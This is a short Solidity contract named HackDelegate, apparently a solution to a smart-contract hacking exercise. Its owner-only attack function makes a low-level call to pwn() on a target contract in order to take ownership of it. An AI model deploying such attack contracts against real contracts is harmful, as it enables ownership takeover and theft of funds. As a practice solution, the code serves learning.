// SPDX-License-Identifier: unlicensing
pragma solidity ^0.8.0;

contract HackDelegate {
    address public target;
    address public owner;
    error CallFailed();

    constructor(address _target) {
        target = _target;
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function attack() public onlyOwner {
        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("pwn()")
        );
        if(!success){
            revert CallFailed();
        }
    }
}
